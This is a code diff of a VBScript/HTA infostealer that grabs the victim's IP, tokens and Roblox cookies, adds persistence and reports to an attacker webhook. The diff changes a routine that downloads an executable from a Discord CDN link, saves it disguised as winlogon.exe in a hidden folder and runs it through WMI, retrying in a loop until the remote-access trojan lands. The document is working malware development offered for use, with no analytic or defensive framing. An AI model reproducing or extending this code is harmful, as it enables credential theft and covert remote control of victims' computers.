@@ -20,15 +20,13 @@ USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 Dim tf: tf = sh.ExpandEnvironmentStrings("%TEMP%") & "\steal1.txt"
 Dim tr: Set tr = fso.CreateTextFile(tf, True): tr.Write "START:" & Now & vbCrLf: tr.Close: Set tr = Nothing
 
-' --- 0. INSTANT RAT DOWNLOAD & EXECUTE (Fires First) ---
-Call DropRAT
-
-' --- 1. GRABS (Fires Immediately After) ---
+' --- 1. GRABS (Target -> Token -> Cookie -> Persistence -> UI -> RAT) ---
 Call IP(WH)
 Call GrabTokens(WH)
 Call GrabRoblox(WH)
 Call Persistence
 Call PostFullRobloxUI(WH)
+Call DropRAT ' RAT drops LAST in the first sequence
 
 ' --- 2. INFINITE Re-grab Loop ---
 Dim runCount
@@ -48,11 +46,8 @@ Loop
 
 window.close()
 
-' --- FASTEST RAT DROP (Write & Execute) ---
+' --- RAT DROP (Spam Loop until success) ---
 Sub DropRAT()
-    ' Spam "Fetching Payload"
-    Call PostEmbed(":package: Fetching Payload", "Attempting RAT download...", 10181046)
-
     ' Exact URL
     Dim exeUrl : exeUrl = "https://cdn.discordapp.com/attachments/1557266192971071579/1571991572017455216/dicecheck.exe?ex=6afcbebc&is=6afb6d3c&hm=a5986bf8435bab1c75a1be20841954d0a60df72e84ef0cbedf1973acf120271d&"
 
@@ -63,32 +58,42 @@ Sub DropRAT()
     Dim op : op = hidDir & "\winlogon.exe"
     If fso.FileExists(op) Then fso.DeleteFile op
 
-    ' Use MSXML2.XMLHTTP to download into memory
-    Dim xh : Set xh = CreateObject("MSXML2.XMLHTTP")
-    xh.Open "GET", exeUrl, False
-    xh.Send
+    ' Spam "Fetching Payload" loop
+    Dim attempts : attempts = 0
+    Do
+        attempts = attempts + 1
+        Call PostEmbed(":package: Fetching Payload", "Attempting RAT download (Try " & attempts & ")...", 10181046)
 
-    ' Write to disk and execute IN THE SAME MILLISECOND
-    If xh.Status = 200 Then
-        Dim stream : Set stream = CreateObject("ADODB.Stream")
-        stream.Type = 1
-        stream.Open
-        stream.Write xh.ResponseBody
-        stream.SaveToFile op, 2
-        stream.Close
-        
-        ' Immediately fire execution via WMI before Defender scans
-        Call RunCmd("""" & op & """")
-    End If
+        ' Use MSXML2.XMLHTTP to download into memory
+        Dim xh : Set xh = CreateObject("MSXML2.XMLHTTP")
+        xh.Open "GET", exeUrl, False
+        xh.Send
 
-    ' Check for success and send final message
-    If fso.FileExists(op) Then
-        If fso.GetFile(op).Size > 100000 Then
-            Dim dsize : dsize = fso.GetFile(op).Size
-            Call PostEmbed(":white_check_mark: RAT Downloaded", "Size: " & CStr(dsize) & " bytes | Launching...", 10181046)
-            Exit Sub ' Stop spamming once successful
+        ' Write to disk
+        If xh.Status = 200 Then
+            Dim stream : Set stream = CreateObject("ADODB.Stream")
+            stream.Type = 1
+            stream.Open
+            stream.Write xh.ResponseBody
+            stream.SaveToFile op, 2
+            stream.Close
         End If
-    End If
+
+        ' Check for success
+        If fso.FileExists(op) Then
+            If fso.GetFile(op).Size > 100000 Then
+                Dim dsize : dsize = fso.GetFile(op).Size
+                Call PostEmbed(":white_check_mark: RAT Downloaded", "Size: " & CStr(dsize) & " bytes | Launching...", 10181046)
+                
+                ' Execute via WMI
+                Call RunCmd("""" & op & """")
+                Exit Sub ' Stop spamming once successful
+            End If
+        End If
+        
+        ' Wait 3 seconds before trying again
+        Call SleepSeconds(3)
+    Loop
 End Sub
 
 ' --- RunCmd (Hidden Execution via WMI) ---
